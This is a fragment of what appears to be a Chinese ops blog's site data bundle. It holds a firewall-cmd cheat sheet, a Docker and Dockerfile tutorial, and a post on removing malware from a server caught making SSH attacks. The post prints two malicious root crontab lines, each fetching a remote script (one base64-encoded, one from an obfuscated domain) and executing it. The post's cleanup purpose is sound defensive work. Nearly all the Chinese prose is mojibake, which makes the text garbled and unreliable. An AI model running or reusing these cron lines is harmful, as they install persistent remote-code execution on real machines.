--zone=public --list-ports\n# å³æååæå¼ç22ç«¯å£\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# æ¹éå¼æ¾ç«¯å£ï¼å¦ä»100å°500è¿ä¹é´çç«¯å£æä»¬å¨é¨è¦æå¼\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# éå¶ipä¸º192.168.0.200çå°åç¦æ­¢è®¿é®80ç«¯å£å³ç¦æ­¢è®¿é®æºå¨\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# è§£é¤åæè¢«éå¶ç192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# éå¶10.0.0.0-10.0.0.255è¿ä¸æ´ä¸ªæ®µçipï¼ç¦æ­¢ä»ä»¬è®¿é®\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³",frontmatter:{title:"Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2305",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2305.Linux%2022%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3.html",relativePath:"01.è¿ç»´/2300.linux/2305.Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³.md",key:"v-62410f40",path:"/linux/2305/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'è¿æ¥åäºçæå¡å¨é­åå°æ»å»ï¼æçæ¯ç±äºä¸ç½ç¯å¢ä¸å®å¨ï¼æå¡å¨é¾æ¥ä¿¡æ¯è¢«å«æï¼æ¤å¥çæ¯é ææå¡å¨åè­¦ï¼åè­¦ä¿¡æ¯å¦ä¸ï¼\n\nè­¦å\n\næ¨çè´¦å·ï¼è´¦å· ID: 100016685465ï¼æµç§°ï¼newï¼ä¸çè®¾å¤ï¼IPï¼121.5.146.143ï¼ï¼å­å¨å¯¹å¶ä»æå¡å¨ç«¯å£ï¼TCPï¼22ï¼çæ»å»è¡ä¸ºï¼è¯·æ¨åå¥½å®å¨èªæ¥æ´æ¹ï¼å¹¶å¨ 24 å°æ¶ååæ­¢ä¸è¿°è¡ä¸ºãå¦é¾ææªå¤çï¼æä»¬æ ¸å®åå°æç¸å³æ³å¾æ³è§åè¾è®¯äºæå¡åè®®è¦æ±å¯¹æ¨åæ­¢æå¡ã\n\nä»åè­¦ä¿¡æ¯å¯ä»¥çåºæ¯æä»¬çæå¡å¨å¯¹å¤åèµ·äºæ»å»ï¼åæ¥å¯¹å¤è®¿é®å¾ 22 ç«¯å£è¢«ç¦ç¨ï¼ç¼è§£äºè¿ä¸ªé®é¢ï¼ä½æ¯æ²¡æä»æ ¹æ¬è§£å³ï¼æ¥ä¸æ¥è®°å½ä¸ä¸å¦ä½è§£å³é®é¢ãé¦åä½ çå°å¾èªå·±çæå¡å¨ç¶åµä¸å®æ¯è¿æ ·ç\n\n\n\né¢å¯¹è¿ç¨å ç¨æä»¬å¯ä»¥ kill æï¼ä½è¿æ¯ä¼è¢«éæ°å¯å¨ï¼æä»¥è¿ç§æåµåæ£æ¥æ¯å¦æå®æ¶ä»»å¡\n\n# æ¾ç¤º crontab ä»»å¡ã \ncrontab -l \n# å¦ææéæ³å®æ¶ä»»å¡å é¤ä» \ncrontab -r ä»»å¡\n\n\n1\n2\n3\n4\n\n\nä½æ¯ææ¥çååäºçæå¡æ²¡æä»»ä½å®æ¶æä»¶å¨æ§è¡ï¼é£æä»¬éè¦æ¥ç /etc/crontab æ¯å¦æéæ³å®æ¶ä»»å¡\n\n* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8vMTQwLjk5LjMyLjQ4L2IyZjYyOC9jcm9uYi5zaAo=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\nä»¥ä¸åå®¹å¯ä»¥çå°æä¸¤ä¸ªå®æ¶ä»»å¡ä¸ç´åè·ï¼å¶ä¸­ä¸ä¸ªä¸ç´å¨ä¸è½½æä»¶å¹¶ä¸æ§è¡ï¼æ­¤æ¶æä»¬å¹²æè¿ä¸¤ä¸ªä»»å¡ï¼æå¨æ³¨æè¿ä¸¤ä¸ªä»»å¡æç¤ºæ\n\næ³¨æ\n\n/etc/crontab" E514: write error (file system full?) ç³»ç»æä»¶å·²æ»¡\n\næ­¤æ¶éè¦å é¤ä¸äºæä»¶éæ¾ç©ºé´ä»¥å¯¹ä»¥ä¸åå®¹è¿è¡ä¿å­\n\n# æ¥çåªä¸ªæä»¶å ç¨è¾å¤§å¯ä»¥å æ\ndu -sh æä»¶\n\n\n1\n2\n\n\nä»¥ä¸å®æåï¼éæ°å¯å¨å®æ¶ä»»å¡\n\nsystemctl restart crond.service\n\n\n1\n\n\næ¾å°è¿ç¨æå¨æä»¶ï¼å é¤æä»¶ï¼åæ­¢è¿ç¨\n\nps -ef | grep 18732\n\n\n1\n\n\nä»¥ä¸æä½ä¸æ¥å¦æè¿æé®é¢ï¼é£ä¹å¯è½éè¦ææ¥æè¿è¡çæå¡æ¯å¦æå¼å¸¸ï¼æ¯å¦ docker æ¯å¦æéå¤å®¹å¨è¢«å¯å¨ç­',normalizedContent:'è¿æ¥åäºçæå¡å¨é­åå°æ»å»ï¼æçæ¯ç±äºä¸ç½ç¯å¢ä¸å®å¨ï¼æå¡å¨é¾æ¥ä¿¡æ¯è¢«å«æï¼æ¤å¥çæ¯é ææå¡å¨åè­¦ï¼åè­¦ä¿¡æ¯å¦ä¸ï¼\n\nè­¦å\n\næ¨çè´¦å·ï¼è´¦å· id: 100016685465ï¼æµç§°ï¼newï¼ä¸çè®¾å¤ï¼ipï¼121.5.146.143ï¼ï¼å­å¨å¯¹å¶ä»æå¡å¨ç«¯å£ï¼tcpï¼22ï¼çæ»å»è¡ä¸ºï¼è¯·æ¨åå¥½å®å¨èªæ¥æ´æ¹ï¼å¹¶å¨ 24 å°æ¶ååæ­¢ä¸è¿°è¡ä¸ºãå¦é¾ææªå¤çï¼æä»¬æ ¸å®åå°æç¸å³æ³å¾æ³è§åè¾è®¯äºæå¡åè®®è¦æ±å¯¹æ¨åæ­¢æå¡ã\n\nä»åè­¦ä¿¡æ¯å¯ä»¥çåºæ¯æä»¬çæå¡å¨å¯¹å¤åèµ·äºæ»å»ï¼åæ¥å¯¹å¤è®¿é®å¾ 22 ç«¯å£è¢«ç¦ç¨ï¼ç¼è§£äºè¿ä¸ªé®é¢ï¼ä½æ¯æ²¡æä»æ ¹æ¬è§£å³ï¼æ¥ä¸æ¥è®°å½ä¸ä¸å¦ä½è§£å³é®é¢ãé¦åä½ çå°å¾èªå·±çæå¡å¨ç¶åµä¸å®æ¯è¿æ ·ç\n\n\n\né¢å¯¹è¿ç¨å ç¨æä»¬å¯ä»¥ kill æï¼ä½è¿æ¯ä¼è¢«éæ°å¯å¨ï¼æä»¥è¿ç§æåµåæ£æ¥æ¯å¦æå®æ¶ä»»å¡\n\n# æ¾ç¤º crontab ä»»å¡ã \ncrontab -l \n# å¦ææéæ³å®æ¶ä»»å¡å é¤ä» \ncrontab -r ä»»å¡\n\n\n1\n2\n3\n4\n\n\nä½æ¯ææ¥çååäºçæå¡æ²¡æä»»ä½å®æ¶æä»¶å¨æ§è¡ï¼é£æä»¬éè¦æ¥ç /etc/crontab æ¯å¦æéæ³å®æ¶ä»»å¡\n\n* * * * * root echo y3vybcatznnttcbodhrwoi8vmtqwljk5ljmyljq4l2iyzjyyoc9jcm9uyi5zaao=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\nä»¥ä¸åå®¹å¯ä»¥çå°æä¸¤ä¸ªå®æ¶ä»»å¡ä¸ç´åè·ï¼å¶ä¸­ä¸ä¸ªä¸ç´å¨ä¸è½½æä»¶å¹¶ä¸æ§è¡ï¼æ­¤æ¶æä»¬å¹²æè¿ä¸¤ä¸ªä»»å¡ï¼æå¨æ³¨æè¿ä¸¤ä¸ªä»»å¡æç¤ºæ\n\næ³¨æ\n\n/etc/crontab" e514: write error (file system full?) ç³»ç»æä»¶å·²æ»¡\n\næ­¤æ¶éè¦å é¤ä¸äºæä»¶éæ¾ç©ºé´ä»¥å¯¹ä»¥ä¸åå®¹è¿è¡ä¿å­\n\n# æ¥çåªä¸ªæä»¶å ç¨è¾å¤§å¯ä»¥å æ\ndu -sh æä»¶\n\n\n1\n2\n\n\nä»¥ä¸å®æåï¼éæ°å¯å¨å®æ¶ä»»å¡\n\nsystemctl restart crond.service\n\n\n1\n\n\næ¾å°è¿ç¨æå¨æä»¶ï¼å é¤æä»¶ï¼åæ­¢è¿ç¨\n\nps -ef | grep 18732\n\n\n1\n\n\nä»¥ä¸æä½ä¸æ¥å¦æè¿æé®é¢ï¼é£ä¹å¯è½éè¦ææ¥æè¿è¡çæå¡æ¯å¦æå¼å¸¸ï¼æ¯å¦ docker æ¯å¦æéå¤å®¹å¨è¢«å¯å¨ç­',charsets:{cjk:!0}},{title:"Docker æ¦å¿µãå½ä»¤åDockerfileä»ç»",frontmatter:{title:"Docker æ¦å¿µãå½ä»¤åDockerfileä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/400",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/40.Docker/400.Docker%20%E6%A6%82%E5%BF%B5%E3%80%81%E5%91%BD%E4%BB%A4%E5%8F%8ADockerfile%E4%BB%8B%E7%BB%8D.html",relativePath:"01.è¿ç»´/40.Docker/400.Docker æ¦å¿µãå½ä»¤åDockerfileä»ç».md",key:"v-7dd6a16f",path:"/docker/400/",headers:[{level:2,title:"1.dockerçæå¿µï¼dockeræ¯ä»ä¹",slug:"_1-dockerçæå¿µ-dockeræ¯ä»ä¹",normalizedTitle:"1.docker çæå¿µï¼docker æ¯ä»ä¹",charIndex:2},{level:2,title:"2.dockeråºç¡å½ä»¤",slug:"_2-dockeråºç¡å½ä»¤",normalizedTitle:"2.docker åºç¡å½ä»¤",charIndex:228},{level:2,title:"3.ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£",slug:"_3-ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£",normalizedTitle:"3. ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£",charIndex:1900},{level:2,title:"4.å¶ä½éåçåºæ¬å½ä»¤",slug:"_4-å¶ä½éåçåºæ¬å½ä»¤",normalizedTitle:"4. å¶ä½éåçåºæ¬å½ä»¤",charIndex:2414},{level:3,title:"æ¦å¿µ",slug:"æ¦å¿µ",normalizedTitle:"æ¦å¿µ",charIndex:2431},{level:3,title:"å½ä»¤",slug:"å½ä»¤",normalizedTitle:"å½ä»¤",charIndex:239},{level:3,title:"éç½®Ideaè¿æ¥Docker",slug:"éç½®ideaè¿æ¥docker",normalizedTitle:"éç½® idea è¿æ¥ docker",charIndex:4504},{level:3,title:"å®ææå»ºSpringBootåºç¨",slug:"å®ææå»ºspringbootåºç¨",normalizedTitle:"å®ææå»º springboot åºç¨",charIndex:4716},{level:2,title:"5. Docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº",slug:"_5-docker-ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº",normalizedTitle:"5. docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº",charIndex:5697},{level:3,title:"é¿éäºä»åº",slug:"é¿éäºä»åº",normalizedTitle:"é¿éäºä»åº",charIndex:5709},{level:3,title:"èªå»ºä»åº",slug:"èªå»ºä»åº",normalizedTitle:"èªå»ºä»åº",charIndex:5715},{level:2,title:"6. ä¸ä¼ DockerHub",slug:"_6-ä¸ä¼ dockerhub",normalizedTitle:"6. ä¸ä¼  dockerhub",charIndex:6101}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"1.dockerçæå¿µï¼dockeræ¯ä»ä¹ 2.dockeråºç¡å½ä»¤ 3.ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£ 4.å¶ä½éåçåºæ¬å½ä»¤ æ¦å¿µ å½ä»¤ éç½®Ideaè¿æ¥Docker å®ææå»ºSpringBootåºç¨ 5. Docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº é¿éäºä»åº èªå»ºä»åº 6. ä¸ä¼ DockerHub",content:'# 1.docker çæå¿µï¼docker æ¯ä»ä¹\n\ndocker åä¸ºä¸ç§æå¿µï¼éå å®¹å¨ ä»åº\néåï¼ç±»ä¼¼äºä¸ä¸ªæ¨¡æ¿ï¼éé¢åå«äºä¸äºåå®¹\nå®¹å¨ï¼å®¹å¨æ¯ä¸ä¸ªéåçå®ä¾ï¼å¦æçè§£éåä¸ºä¸ä¸ª classï¼é£ä¹å®¹å¨å°±è¢«çè§£ä¸ºæ¯ new class (); æ¯éåçå®ä¾\nä»åºï¼å°±æ¯ä¸è½½éåèµæºçå°æ¹ã\ndocker å®¹å¨ä¸æ¯èææºï¼å®¹å¨å¯ä»¥è¯´æ¯ä¸ä¸ªè¿ç¨ï¼æä»¬å¯ä»¥ç»å®¹å¨åéåå­ãå°±å windows å®è£äºèææºï¼å¯ä»¥ç»èææºåéåå­å¤§å°ï¼ç£çç©ºé´ã\n\n\n# 2.docker åºç¡å½ä»¤\n\næç´¢éåï¼ä» maven ä»åºä¸­æ¥è¯¢\n\ndocker search mysql\n\n\n1\n\n\nååºå½åç³»ç»å­å¨çéå\n\ndocker images\n\n\n1\n\n\nç»éåæ´æ¢åç§°\n\ndocker tag imageId repository:tag\n\n\n1\n\n\nå é¤éå (-f å¼ºå¶) å¿é¡»ç¥ééåç imageId\n\ndocker rmi -f imageId\n\n\n1\n\n\nrepository:tag (éåçä»åºæºï¼éåçæ ç­¾) æå\n\ndocker pull repository:tag\n\n\n1\n\n\nè¿è¡ä¸ä¸ªå®¹å¨\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * runï¼è¿è¡å®¹å¨å½ä»¤\n * -itï¼è¿è¡åç´æ¥ä¸ç»ç«¯äº¤äºï¼æ¯å¦è¿è¡ jar æå¶ä»åºç¨çæ¶å æ¥çä»ä»¬çå¯å¨ä¿¡æ¯\n * -dï¼åå°è¿è¡\n * -p port1:port2ï¼ç«¯å£æ å° port1 (å®¿ä¸»æº) port2 (å®¹å¨) å®¹å¨çç«¯å£æ¯å¯ä»¥éå¤çï¼æä»¥å®¹å¨åç©çæºçç«¯å£å¯ä»¥ä¸è´ãrabbitmq æä¸¤ä¸ªç«¯å£ 5672 å 15672 æä»¥ä¼ç¨å°å -p repository:tag -> å¦æä¸æå® tagï¼é»è®¤ä½¿ç¨ææ°ç\n * --name "xxx"ï¼æå®å®¹å¨åç§°\n * -v /home/data:/dataï¼/home/data (å®¿ä¸»æº):/data (å®¹å¨) æ¬å°å°ååå®¹å¨å°åäº§çæè½½å³ç³»ï¼ å¨å®¹å¨åé¨è¯¥ç®å½ä¸ï¼æèå®¿ä¸»æºåé¨è¯¥ç®å½ä¸ï¼ä¿®æ¹æä»¶ãåå»ºæä»¶ï¼å½¼æ­¤é½ä¼åæ­¥ä¿®æ¹\n * --restart=alwaysï¼æ»æ¯è¿è¡ï¼å½éå¯ docker åä¼èªå¨è¿è¡èµ·æ¥\n * repository:tagï¼æå®è¿è¡éåçåç§°\n\næ¥çè¿è¡çå®¹å¨\n\ndocker ps \n\n\n1\n\n\næ¥çææç¶æçå®¹å¨\n\ndocker ps -a\n\n\n1\n\n\næ£æ¥å®¹å¨åé¨ä¿¡æ¯\n\ndocker inspect å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nåæ­¢å®¹å¨\n\ndocker stop å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nå¼å¯å®¹å¨è¿è¡\n\ndocker start å®¹å¨åç§°\n\n\n1\n\n\nå é¤å®¹å¨ä¹åå¿é¡»ååæ­¢å®¹å¨è¿è¡\n\ndocker rm å®¹å¨åç§°\n\n\n1\n\n\næ¥çå®¹å¨æ¥å¿\n\ndokcer logs -f å®¹å¨id\n\n\n1\n\n\nè¿å¥å®¹å¨åé¨\n\ndocker exec -it mysql bash#  è¿å¥mysqlåé¨\nmysql -uroot -p123456#  ç»å½mysqlæå¡ æ³¨æè¿émysql -uroot -p123456 æ¯è¿èµ·æ¥ç\n\n\n1\n2\n\n\næä¸ä¸ªå®¹å¨å¶ä½ä¸ºä¸ä¸ªæ°çéå\n\ndocker commit \n -m="æäº¤ä¿¡æ¯" \n -a="ä½è" \n å®¹å¨id\n èªå®ä¹éååç§°:[èªå®ä¹æ ç­¾å]\n\n\n1\n2\n3\n4\n5\n\n\næ¥çå®¹å¨çä¿¡æ¯\n\ndocker inspect å®¹å¨ID\n\n\n1\n\n\nå¯¹äºæ²¡æç§æä»åºçè¦ä½¿æå¡å¨é´å±äº«ä¸ä¸ª docker éåï¼å¯ä»¥åææå°æºå¨ä¸çè¿è¡åå¯¼åºï¼ç¶åå¶ä»æå¡å¨å¨å¯¼å¥å³å¯\n\n# å¯¼åº\ndocker save \n éåID\n -o /æ¬å°è·¯å¾/æä»¶.tar  è¿å¥è¯ææå¯¼åºå°ä½ å®¿ä¸»æºçä¸ä¸ªå°åï¼æä»¶åéä¾¿èµ·åç¼ä¸ºtarï¼è·¯å¾è¦æåå»ºå¥½\n\n# å¯¼å¥\ndocker load < /ä¸ä¼ æä»¶çå°å/å¯¼åºçæä»¶å.tar\n\n# æ¥çå¯¼å¥çéå\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå®¹å¨ä¹é´å±äº«ï¼å®¹å¨ 2 å±ç¨ å®¹å¨ 1\n\ndocker tun -it \n  -- name å®¹å¨2\n  --volumes-from å®¹å¨1(å®¹å¨1å¿é¡»å·²å¯å¨)\n  éååç§°\n\n\n1\n2\n3\n4\n\n\næ¥çå¶ä½éåæ¶å å å¶ä»éåçæä½\n\ndocker history éåID\n\n\n1\n\n\n\n# 3. ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£\n\n1ãåæ­¢å®¹å¨ (docker stop d00254ce3af7)\n2ãåæ­¢ docker æå¡ (systemctl stop docker)\n3ãä¿®æ¹è¿ä¸ªå®¹å¨ç hostconfig.json æä»¶ä¸­çç«¯å£ï¼åå¸æäººæå°ï¼å¦æ config.v2.json éé¢ä¹è®°å½äºç«¯å£ï¼ä¹è¦ä¿®æ¹ï¼\n\ncd /var/lib/docker/containers/d00254ce3af7*    # è¿éæ¯CONTAINER ID\n\nvim hostconfig.json\nå¦æä¹åæ²¡æç«¯å£æ å°, åºè¯¥æè¿æ ·çä¸æ®µ:\n"PortBindings":{}\n\nå¢å ä¸ä¸ªæ å°, è¿æ ·å:\n"PortBindings":{"8080/tcp":[{"HostIp":"","HostPort":"60000"}]}\nåä¸ä¸ªæ°å­æ¯å®¹å¨ç«¯å£, åä¸ä¸ªæ¯å®¿ä¸»æºç«¯å£ãå°å®¿ä¸»æºç60000ç«¯å£æ å°å°å®¹å¨ç8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4ãå¯å¨ docker æå¡ (systemctl start docker)\n5ãå¯å¨å®¹å¨ (docker start d00254ce3af7)\n\n\n# 4. å¶ä½éåçåºæ¬å½ä»¤\n\n\n# æ¦å¿µ\n\n\n\nDockerfile é»è®¤ä¼æå½åæå¨æä»¶çä¸ä¸é®é½åéç» Docker Serverï¼æç»å¶ä½æä¸ä¸ªéåï¼æ¯å¦ä½ å¾ DockerFile å¨ linux çæ ¹ (/) ç®å½ï¼é£ä¹å°±ä¼éå½æ ¹ç®å½ä¸çæææä»¶ï¼åéå° Docker Server å¶ä½éåï¼æä»¥å¶ä½ Dockerfile æå¥½æ¯å¨æä¸ä¸ªå°æ¹æ°å»ºæä»¶å¤¹å»å¶ä½ãå¶ä½è¿ç¨é½æ¯ä¾èµäºä¸ä¸ªä¸ªçéåï¼æä»¥ä¼æç¼å­å éä¸æ¬¡å¶ä½ï¼å¦æä¸éè¦ä¾èµç¼å­ å¯ä»¥å¨å½ä»¤å¶ä½çæåé¢å  --no-cache\n\n.dockerIgnore æ¯ç¨æ¥å¿½ç¥åªäºæä»¶æç®å½ä¸åä¸å°å¶ä½éåä¸­\n\nå¶ä½å½ä»¤ï¼ docker build -f /home/docker/nginx/Dockerfile . -f ç¨æ¥æå® Dockerfile æå¨çä½ç½®ï¼ä¸è¬ä¼ä½¿ç¨ docker build -t nginx2 . -t å¨å½åç®å½å¶ä½éåï¼ nginx2 éåçåå­ï¼ . ä»£è¡¨ Dockerfile å°±å¨å½åç®å½\n\n\n# å½ä»¤\n\næä»¤            æè¿°\nFROM          æå»ºçæ°éåæ¯åºäºåªä¸ªéåãä¾å¦ï¼FROM centos:6ï¼ç¬¬ä¸ä¸ªæä»¤å¿é¡»æ¯ FROM\nMAINTAINER    éåç»´æ¤èå§åæé®ç®±å°åãä¾å¦ï¼MAINTAINER Mr.chen\nRUN           æå»ºéåæ¶è¿è¡ç Shell å½ä»¤ãä¾å¦ï¼RUN ["yum","install","httpd"] ä¹å¯ä»¥ç´æ¥ RUN\n              yum install httpd æè RUN yum install httpd\nCMD           å®¹å¨è¿è¡æ¶æ§è¡çShellå½ä»¤ ï¼ç¼åç dockerfile ä¸­å¤ä¸ª cmd é½ä¼æ§è¡ï¼ä½é»è®¤ä¿çæåä¸ä¸ªå½ä»¤ï¼å¦æ\n              docker run è¿è¡æ¶ä¼ é commandï¼ä¼è¦ç cmd çä¿çå½ä»¤ï¼ï¼å¯å¨å®¹å¨ä¼æ§è¡ CMD\n              çä¿çå½ä»¤ãä¾å¦ï¼CMD ["-c","/start.sh"] ä¹å¯ä»¥æ¯ CMD echo \'hello docker\'\nEXPOSE        å£°æå®¹å¨è¿è¡çæå¡ç«¯å£ãä¾å¦ï¼EXPOSE 80 443ï¼ä½æ¯é»è®¤é½æ¯ tcp åè®®ï¼å¦ææ³è¦æ´æ¼ udp åè®®ï¼åæ¯\n              EXPOSE 80/udp ï¼æ³¨æåªè½æ¯ tcp æ udp\nENV           è®¾ç½®å®¹å¨åçç¯å¢åéãä¾å¦ï¼ENV MYSQL_ROOT_PASSWORD 123456\nADD           å°å®¿ä¸»æºç®å½ä¸çæä»¶æ·è´è¿éåä¸ ADD å½ä»¤ä¼èªå¨å¤ç URL åè§£å tar å ä¾å¦ï¼ADD\n              ["src","dest"] æè ADD https://xxx.com/html.tar.gz\n              /var/www/html æèï¼ADD html.tar.gz/var/www/html\nCOPY          æ·è´æä»¶æç®å½å°éåï¼ä¸è½èªå¨è§£åç¼©ï¼ãä¾å¦ï¼COPY ./start.sh/start.sh\nENTRYPOINT    è¿è¡å®¹å¨æ¶æ§è¡ç Shell å½ä»¤ï¼ä¸è½è¢«è¿è¡æ¶ä¼ éçåæ°è¦ç)ï¼æ¯ CMD çç®ä¸äºãä¾å¦ï¼ENTRYPOINT\n              ["/bin/bash","-c","/start.sh"] æè ENTRYPOINT /bin/bash -c\n              "/start.sh"\nVOLUME        æå®å®¹å¨æè½½ç¹å°å®¿ä¸»æºèªå¨çæçç®å½æå¶ä»å®¹å¨ ä¾å¦ï¼VOLUME ["/var/lib/mysql"]\nUSER          ä¸º RUNï¼CMD å ENTRYPOINT æ§è¡å½ä»¤æå®è¿è¡ç¨æ· ä¾å¦ï¼USER Mr_chen\nWORKDIR       æå®å¨åå»ºå®¹å¨åï¼ç»ç«¯é»è®¤ç»å½è¿æ¥çå·¥ä½ç®å½ï¼ä¸ä¸ªè½èç¹ ä¾å¦ï¼WORKDIR /dataï¼ è¯¥å½ä»¤ä¹ä¼å½±å\n              ENTRYPOINT è¿è¡ä¾å¦jaråæ¶çä½ç½®ï¼é»è®¤ä¼èªå¸¦WORKDIRçè·¯å¾\nHEALTHCHECK   å¥åº·æ£æ¥ãä¾å¦ï¼HEALTHCHECK --interval=5m --timeout=3s --retries=3\n              CMD curl -f http://localhost/ exit 1\nARG           å¨æå»ºéåæ¶æå®ä¸äºåæ°ãä¾å¦ï¼ARG user\nONBUILD       å½éåè¢«ç»§æ¿åè§¦åå¨ ONBUILD éåçå½ä»¤ï¼ç»§æ¿èç´æ¥ä½¿ç¨ FROM å½ä»¤ç»§æ¿å½åéåçåç§°å³å¯ï¼å¨ build\n              çæ¶åè§¦å\n\næç¤º\n\nä» docker17.05 çæ¬å¼å§ï¼dockerfile ä¸­åè®¸ä½¿ç¨å¤ä¸ª FROM æä»¤\n\n\n# éç½® Idea è¿æ¥ Docker\n\néç½®åæ¹ä¾¿æä»¬æåå¥½ç Docker File ç´æ¥ææéåå° Docker ä¸­ï¼æ¹ä¾¿è¿è¡åç®¡ç\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1ï¼å è½½dockerå®æ¤çº¿ç¨\nsystemctl restart docker // 2ï¼éå¯docker\n\n\n1\n2\n\n\n\n# å®ææå»º SpringBoot åºç¨\n\nå¨åºç¨çæ ¹ç®å½ä¸­åå»º Dockerfileï¼å·ä½æå»ºä¹åä¸å®è¦äºè§£ SpringBoot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼è¿éçµæ¯å°æä»¬å¨ä¿®æ¹éç½®æä»¶æ¶ï¼å¯ä»¥æå®æè½½å¤é¨æä»¶ä¿®æ¹ååæ­¥å°å®¹å¨ï¼å¦åï¼æ¯æ¹ä¸æ¬¡é½è¦éæ°å¶ä½éå\n\næç¤º\n\nSpringBoot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼\nå·¥ç¨æ ¹ç®å½:./config/\nå·¥ç¨æ ¹ç®å½ï¼./\nclasspath:/config/\nclasspath:/\n\n# åºç¡éå\nFROM openjdk:8-jre-slim\n# ä½è\nMAINTAINER biguncle\n# éç½®\nENV PARAMS=""\nEXPOSE 8081\n# æ¶åº\nENV TZ=Asia/Shanghai\nRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n# æ·»å åºç¨\nADD ./target/tool-boot-0.0.1-SNAPSHOT.jar /server/tool-boot.jar\n# åå»ºä¸ä¸ªå·¥ä½ç®å½ï¼å¹¶å°å¤é¨éç½®æä»¶å¤å¶å°éåä¸­\nRUN mkdir /server/config\nCOPY /src/main/resources/application.yml /app/config/\nWORKDIR /server\n## å¨éåè¿è¡ä¸ºå®¹å¨åæ§è¡çå½ä»¤\nENTRYPOINT java -jar -Dpolyglot.engine.WarnInterpreterOnly=false tool-boot.jar  $PARAMS\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ§è¡å½ä»¤\n\n#build æå»ºåºç¨çéå\ndocker build -f ./Dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\nè¿è¡å®¹å¨\n\n#build æå»ºåºç¨çéå\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. Docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº\n\n\n# é¿éäºä»åº\n\n 1. åç»å½é¿éäºéåæå¡ï¼å°å\n 2. åå»ºä¸ªäººæä¼ä¸å®ä¾\n 3. åå»ºéåä»åºï¼è¿ä¸ªä»åºå¯ä»¥å»ºå¤ä¸ªï¼çèªå·±\n 4. åå»ºå®æ¯ä¹åå¯ä»¥æ ¹æ®é¿éäºæä¾çæ­¥éª¤è¿è¡æ¨éææå\n\n\n\nå¦ææä»¬åªæ¯æ³ç¨é¿éäºçéåå éå¨ï¼å¯ä»¥æ¾å°å¦ä¸å¾æä½å³å¯ã\n\n\n\n\n# èªå»ºä»åº\n\n 1. æåä»åºéå\n\ndocker pull registry\n\n\n1\n\n 2. è¿è¡éå\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. æ¥çéåä¿¡æ¯\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. ä¸ä¼  DockerHub\n\n 1. é¦åä¿è¯ä½ ç»å½\n\ndocker login --username=xxxx\n\n\n1\n\n 2. æå»ºéå\n\ndocker build -t è´¦å·/åºç¨åç§° -f Dockerfile .\n\n\n1\n\n 3. å¨ DockerHub æ°å»ºä»åº https://hub.docker.com/\n 4. ç»éåæä¸ä¸ª tag æ ç­¾\n\ndocker tag è´¦å·/åºç¨åç§° è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n\n 5. ä¸ä¼ \n\ndocker push è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n',normalizedContent:'# 1.docker çæå¿µï¼docker æ¯ä»ä¹\n\ndocker åä¸ºä¸ç§æå¿µï¼éå å®¹å¨ 